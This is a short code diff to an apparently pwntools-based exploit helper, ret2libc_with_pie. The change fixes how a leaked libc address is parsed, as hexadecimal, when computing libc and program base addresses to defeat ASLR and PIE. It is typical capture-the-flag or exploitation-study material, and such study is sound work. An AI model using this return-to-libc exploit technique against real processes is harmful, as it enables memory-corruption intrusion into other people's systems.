@@ -112,7 +112,7 @@ def ret2libc_with_pie(libc_so, func_index, symbol,base_addr, libc_func,active_pr
     
 	# gef➤  x 0x7ffff7d0ccf1
     # 0x7ffff7d0ccf1 <__GI___libc_read+17>:   0xf0003d48
-	libc.address = int(libc_func_leak) - int(func_index) - int(libc.sym[symbol])
+	libc.address = int(libc_func_leak, 16) - int(func_index) - int(libc.sym[symbol])
 
 	# find beginning page offset by going into GDB and running vmmap
 	active_process.address = int(base_address) - int(0x00000000001000)  # base address - beginning page offset 
